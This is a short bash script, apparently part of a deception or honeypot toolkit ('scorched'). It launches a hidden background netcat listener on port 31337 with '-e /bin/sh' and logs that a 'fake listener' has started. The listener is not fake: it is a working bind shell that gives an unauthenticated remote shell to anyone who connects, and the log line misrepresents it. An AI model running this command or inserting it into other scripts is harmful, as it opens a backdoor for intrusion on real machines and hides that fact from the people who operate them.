#!/bin/bash
source ./libs/helpers.sh; safe nc
PORT="${1:-31337}"
nohup nc -lkp "$PORT" -e /bin/sh >/dev/null 2>&1 &
echo "$(ts) Fake listener started on port $PORT" >> /var/log/scorched.log

